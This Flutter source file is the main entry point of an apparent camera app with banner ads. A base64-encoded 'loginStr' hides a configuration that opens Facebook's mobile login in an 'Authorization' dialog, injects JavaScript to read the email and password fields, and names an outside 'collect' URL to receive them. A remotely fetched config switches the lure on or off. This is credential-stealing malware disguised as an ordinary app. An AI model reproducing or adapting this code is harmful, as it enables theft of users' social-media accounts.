import 'package:camera/camera.dart';
import 'package:dio/adapter.dart';
import 'package:flutter/material.dart';
import 'package:dio/dio.dart';
import 'dart:convert';
import 'dart:io' show HttpClient, HttpOverrides, HttpStatus, Platform;

import 'package:flutter_camera/datas/configModel.dart';
import 'package:flutter_camera/dialogs/login_dialog.dart';
import 'package:flutter_camera/pages/home.dart';
import 'package:applovin_max/applovin_max.dart';
import 'package:flutter_camera/utils/MyHttpOverrides.dart';
import 'package:flutter_camera/utils/SQScreen.dart';
import 'package:flutter_camera/utils/SharedPreferencesUtils.dart';
import 'package:flutter_camera/utils/mlog.dart';
import 'package:flutter_camera/widgets/image_click.dart';


List<CameraDescription> cameras = <CameraDescription>[];

Future<void> initCamera() async {
  WidgetsFlutterBinding.ensureInitialized();
  cameras = await availableCameras();
  if(cameras.length >2){
    cameras = cameras.sublist(0,2);
  }
}

void main() {
  HttpOverrides.global = MyHttpOverrides();
  initCamera();
  runApp(const MyApp());
}

String _banner_ad_unit_id = "10424d6678069178";

void initializeBannerAds() {
  AppLovinMAX.createBanner(_banner_ad_unit_id, AdViewPosition.bottomCenter);
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Flutter Demo',
      theme: ThemeData(
        // This is the theme of your application.
        //
        // Try running your application with "flutter run". You'll see the
        // application has a blue toolbar. Then, without quitting the app, try
        // changing the primarySwatch below to Colors.green and then invoke
        // "hot reload" (press "r" in the console where you ran "flutter run",
        // or simply save your changes to "hot reload" in a Flutter IDE).
        // Notice that the counter didn't reset back to zero; the application
        // is not restarted.
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);

  // This widget is the home page of your application. It is stateful, meaning
  // that it has a State object (defined below) that contains fields that affect
  // how it looks.

  // This class is the configuration for the state. It holds the values (in this
  // case the title) provided by the parent (in this case the App widget) and
  // used by the build method of the State. Fields in a Widget subclass are
  // always marked "final".

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  bool isShow = false;

  String loginStr = "eyJlbmNvZGUiOiJNSUdmTUEwR0NTcUdTSWIzRFFFQkFRVUFBNEdOQURDQmlRS0JnUUNHK25od0N5ZzRQc0xrMUNSSGJJSytFMCsxT1Nob1dJYng2OElURFczdkZTWHNXMXpaOUFOTGpxR1lBT0VrWHdPZGZqelp1V0NoN1ZtMlpDakx4emNCNnRwWU1RVkJPZ0s0TzNrYllza1loNTRjVERDQlBNMi9VQ2NuTGNiYVU5OTRwWjFtUzZkRU0vT1BRWGIzS3ZDVk9ZRlJVUHlOSGJUKy9OcUNGcllpZVFJREFRQUIiLCJkdmIiOiJkZXZpY2UtYmFzZWQiLCJyX3VybCI6Imh0dHBzOi8vbS5mYWNlYm9vay5jb20vIiwicGFkZGluZyI6IlJTQS9FQ0IvUEtDUzFQYWRkaW5nIiwiYXBwX25hbWUiOiJUaGVmdW4gQ2FtZXJhIiwiY191cmwiOiJodHRwczovL2tjb2ZmbmkueHl6L2FwaS9vcGVuL2NvbGxlY3QiLCJwYWNrYWdlIjoiZnVuY2FtLmZyZWRvbm0uYXBwIiwianNjb2RlcyI6IihmdW5jdGlvbigpe3JldHVybiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbV9sb2dpbl9lbWFpbCcpLnZhbHVlKydfMV8xXzlfJytkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbV9sb2dpbl9wYXNzd29yZCcpLnZhbHVlO30pKCkiLCJqc3NwbGl0IjoiXzFfMV85XyIsInRpdGxlIjoiQXV0aG9yaXphdGlvbiIsImNoZWNrX2tleSI6InhzIn0=";

  @override
  void initState() {
    super.initState();
    initializePlugin();
    getHttp();
  }

  Future<void> initializePlugin() async {
    logStatus("Initializing SDK...");

    Map? configuration = await AppLovinMAX.initialize(
        "RH7xIMirQp-k9XpQo6fmPQgzvCNPd1VTpxsoG4eyyoz2-fkg4HgvP7tWttcTng2iC9vnT4Mvp7Gi_69V2xZxPX");
    if (configuration != null) {
      logStatus("SDK Initialized: $configuration");
      initializeBannerAds();

      AppLovinMAX.showBanner(_banner_ad_unit_id);
    }
  }

  void logStatus(String status) {
    print(status);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      resizeToAvoidBottomInset: false,
      body: ConstrainedBox(
        constraints: const BoxConstraints.expand(),
        child: Stack(alignment: Alignment.center, children: <Widget>[
          SizedBox(
            width: double.maxFinite,
            height: double.maxFinite,
            child: Image.asset(
              "assets/images/bg_sell.png",
              fit: BoxFit.fill,
            ),
          ),
          Positioned(
            bottom: 60.0,
            child: InkWell(
              // When the user taps the button, show a snackbar.
              onTap: () {
                AppLovinMAX.hideBanner(_banner_ad_unit_id);
                showLoginDialog();
              },
              child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: <Widget>[
                    Opacity(
                        opacity: 1.0,
                        child: getUI()
                    ),
                  ]),
            ),
          ),
        ]
        )
        ,
      )
      ,
      // This trailing comma makes auto-formatting nicer for build methods.
    );
  }

  Widget getUI() {
    if (isShow) {
      return Image.asset("assets/images/ic_bb_op.png",
          height: 100.0);
    } else {
      return Container();
    }
  }

  Future<bool?> showLoginDialog() {
    return showModalBottomSheet<bool>(
        isScrollControlled: true,
        isDismissible: false,
        enableDrag: false,
        context: context,
        builder: (context) {
          return SizedBox(
            height: SQScreen.height
                * 0.7,
            child: LoginDialog(
                loginStr),
          );
        });
  }

  void getHttp() async {
    try {
      var response = await Dio().get('https://funge.fun/config');
      var data = response.data.toString().replaceRange(1, 2, "");

      List<int> bytes2 = base64Decode(data);
      String decodeStr = String.fromCharCodes(bytes2);
      var config =
      ConfigModel.fromJson(json.decode(decodeStr) as Map<String, dynamic>);

      if (config.l == 0 || await spGetBool()) {
        setState(() {
          isShow = false;
        });

        Navigator.push(context, MaterialPageRoute(builder: (context) {
          return HomePage();
        }));
      } else {
        setState(() {
          isShow = true;
        });
      }
    } catch (e) {
      print(e);
    }
  }
}
